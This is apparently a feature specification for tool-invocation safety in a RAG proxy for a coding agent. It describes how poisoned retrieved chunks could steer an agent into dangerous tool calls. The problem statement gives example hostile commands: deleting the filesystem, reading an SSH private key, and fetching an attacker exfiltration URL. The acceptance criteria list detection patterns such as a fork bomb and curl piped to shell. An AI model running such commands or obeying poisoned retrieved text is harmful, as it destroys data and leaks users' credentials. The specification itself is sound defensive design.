# Feature: Tool Invocation Safety for RAG-Influenced Responses

**Source:** OWASP RAG Security Cheat Sheet — Section 9 (Tool Invocation Safety)
**Reference:** https://cheatsheetseries.owasp.org/cheatsheets/RAG_Security_Cheat_Sheet.html#tool-invocation-safety

## Problem

When the RAG proxy answers a query locally or via provider fallthrough, the response may instruct the agent to invoke tools (read files, execute shell commands, edit files, fetch URLs). If the RAG response was influenced by a poisoned chunk, the tool invocation could be malicious — e.g., "run `rm -rf /`", "read ~/.ssh/id_rsa", "fetch http://attacker.com/exfil".

The RAG proxy is not a neutral pass-through: it actively selects and prioritizes content. A poisoned chunk that survives validation could still influence the agent to take dangerous actions. The RAG proxy must apply tool invocation safety checks on its outputs and on the agent's subsequent tool calls.

## User Story

As a developer using opencode-config's RAG proxy, I want tool invocations that originate from or are influenced by RAG-sourced content to be subject to additional safety validation, so that poisoned chunks cannot trick the agent into executing dangerous commands.

## Acceptance Criteria

### RAG-Origin Tool Call Tagging
- Given a response is partially or fully from RAG (local answer or RAG-influenced provider call), when the response contains tool call requests, the proxy tags each tool call with metadata: `{ origin: "rag" | "hybrid" | "provider", source_chunks: [...], confidence: 0.92 }`.
- Given a tool call is tagged with RAG origin, when the agent executes the tool, the proxy's existing permission system applies with an additional "RAG-sourced" warning level.
- Given a tool invocation involves `bash`, `write`, or `edit` tools, when the invocation is RAG-sourced, the user is prompted for confirmation before execution (if not already required by the mode).

### Dangerous Command Detection in RAG Output
- Given a RAG-synthesized answer contains shell commands (text inside code blocks or inline), when the proxy detects the output, it scans for dangerous patterns: `rm -rf`, `chmod 777`, `> /dev/`, `dd if=`, `mkfs`, `:(){ :|:& };:`, curl/wget piping to shell, base64 decode to pipe.
- Given a dangerous pattern is detected in RAG output, when the proxy identifies it, it replaces the dangerous command text with a `[COMMAND REMOVED — dangerous pattern: <pattern>]` placeholder, logs the event, and returns the sanitized output.
- Given the dangerous command is in a code block context (suggested rather than literal execution), when detected, the proxy applies a lower severity: it leaves the command but adds a visible warning comment above it.

### Tool Invocation Chaining Detection
- Given the RAG response triggers multiple tool invocations in sequence, when the proxy tracks the chain, it monitors for suspicious escalation patterns (e.g., read file → modify file → execute file).
- Given an escalation pattern is detected across RAG-influenced tool calls, when the chain includes a dangerous operation (write to .git/hooks/ or .bashrc, modify CI config, change permissions), the proxy blocks the final operation and alerts the user.

### Audit Logging for All RAG-Sourced Invocations
- Given any tool invocation is influenced by RAG content, when the invocation occurs, the full chain is logged: query → retrieved chunks → tool call → arguments → outcome.
- Given a tool invocation is blocked or flagged, when the event is logged, it includes the triggering chunk source and the matched dangerous pattern.

## Implementation Notes

- Tool safety module: `plugins/rag-proxy/tool-safety.ts`
- RAG origin tagging: Attach metadata to tool call objects before they reach the agent
- Dangerous patterns: Curated list from OWASP and common malware patterns
- Escalation detection: Track tool call sequence per session, flag dangerous chains
- Permission integration: Hook into existing OpenCode permission system; add `rag_sourced` permission level

## Definition of Done

- [ ] RAG-origin tool calls tagged with metadata (origin, source chunks, confidence)
- [ ] User confirmation prompt for RAG-sourced bash/write/edit tool calls
- [ ] Dangerous command pattern detection and redaction in RAG output
- [ ] Tool invocation chaining detection with escalation monitoring
- [ ] Audit logging for all RAG-sourced tool invocations
- [ ] Integration with existing OpenCode permission system
- [ ] Unit tests for pattern detection, chaining detection, audit logging
- [ ] Wiki documentation updated
